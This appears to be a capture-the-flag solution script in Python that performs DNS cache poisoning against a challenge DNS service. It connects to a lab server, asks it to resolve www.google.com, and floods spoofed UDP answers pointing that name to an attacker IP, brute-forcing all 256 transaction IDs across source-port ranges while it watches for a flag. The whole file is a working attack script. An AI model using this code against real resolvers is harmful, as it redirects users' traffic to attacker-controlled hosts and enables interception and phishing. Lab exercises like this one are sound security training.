#!/usr/bin/env python3
import socket
import struct
import threading
import time
import re
import sys
from utils import build_response_packet, RecordType, ResponseCode

# Configuration
TARGET_DOMAIN = "www.google.com"
ATTACKER_IP = "11.4.5.14"
TTL = 600
SERVER_IP = '140.112.91.4'
SERVER_PORT = 48765
RESOLVER_IP = '140.112.30.191'
RESOLVER_PORT = 53053

def extract_port(output: str) -> int:
    """Extract source port from server output"""
    match = re.search(r'source port (\d+)', output)
    return int(match.group(1)) if match else -1

def send_poisoned_responses(target_ip: str, target_port: int):
    """Send poisoned DNS responses for all possible transaction IDs"""
    print(f"Sending poisoned responses to {target_ip}:{target_port}")
    
    # Create UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    try:
        # Try to bind to resolver port to spoof source
        sock.bind((RESOLVER_IP, RESOLVER_PORT))
        print(f"Successfully bound to {RESOLVER_IP}:{RESOLVER_PORT}")
    except Exception as e:
        try:
            # Fallback: bind to any available port
            sock.bind(('', 0))
            print(f"Bound to fallback port: {sock.getsockname()}")
        except Exception as e2:
            print(f"Failed to bind socket: {e2}")
            return
    
    successful_sends = 0
    
    # Send responses for all possible transaction IDs (0-255)
    for tid in range(256):
        try:
            # Build poisoned response packet
            response_packet = build_response_packet(
                tid=tid,
                domain=TARGET_DOMAIN,
                qtype=RecordType.A,
                rcode=ResponseCode.NOERROR,
                answer=ATTACKER_IP,
                ttl=TTL
            )
            
            # Send the packet
            sock.sendto(response_packet, (target_ip, target_port))
            successful_sends += 1
            
        except Exception as e:
            continue
    
    sock.close()
    print(f"Sent {successful_sends}/256 poisoned responses")
    return successful_sends

def main():
    print("=== FATCAT DNS Cache Poisoning Attack ===")
    print(f"Target: {TARGET_DOMAIN} -> {ATTACKER_IP}")
    
    try:
        # Connect to FATCAT DNS server
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.connect((SERVER_IP, SERVER_PORT))
        server_sock.settimeout(10)
        
        print(f"Connected to {SERVER_IP}:{SERVER_PORT}")
        
        # Read and display banner
        banner_lines = []
        for i in range(4):  # Read banner lines
            try:
                line = server_sock.recv(1024).decode()
                banner_lines.append(line.strip())
                print(f"Banner: {line.strip()}")
            except:
                break
        
        # Prepare the attack
        query = f"{TARGET_DOMAIN} A\n"
        print(f"Sending query: {query.strip()}")
        
        # Start attack thread that will send poisoned responses
        attack_started = threading.Event()
        
        def attack_thread():
            # Wait a bit for the query to be processed
            attack_started.wait()
            time.sleep(0.05)  # Small delay to let query get processed
            
            # Try flooding multiple port ranges
            for base_port in range(32768, 65536, 1000):
                for port_offset in range(0, min(1000, 65536 - base_port), 50):
                    port = base_port + port_offset
                    send_poisoned_responses(SERVER_IP, port)
        
        # Start the attack thread
        attack = threading.Thread(target=attack_thread)
        attack.daemon = True
        attack.start()
        
        # Send the DNS query
        server_sock.send(query.encode())
        attack_started.set()
        
        # Read server response
        found_flag = False
        while True:
            try:
                response = server_sock.recv(1024).decode()
                if not response:
                    break
                
                print(f"Server: {response.strip()}")
                
                # Extract the actual port and attack it specifically
                port = extract_port(response)
                if port != -1:
                    print(f"Extracted port {port}, attacking specifically...")
                    # Attack the specific port in a separate thread
                    threading.Thread(target=send_poisoned_responses, 
                                   args=(SERVER_IP, port)).start()
                
                # Check for success indicators
                if "Flag:" in response or "FLAG1" in response:
                    print(f"\n*** SUCCESS! FLAG FOUND: {response.strip()} ***")
                    found_flag = True
                    break
                    
                if "Cache polluted successfully" in response:
                    print("\n*** CACHE POISONING SUCCESSFUL! ***")
                    
            except socket.timeout:
                print("Timeout waiting for server response")
                break
            except Exception as e:
                print(f"Error reading from server: {e}")
                break
        
        if not found_flag:
            print("Attack completed, no flag received")
            
    except Exception as e:
        print(f"Error during attack: {e}")
        
    finally:
        try:
            server_sock.close()
        except:
            pass
    
    print("Attack finished")

if __name__ == "__main__":
    main()
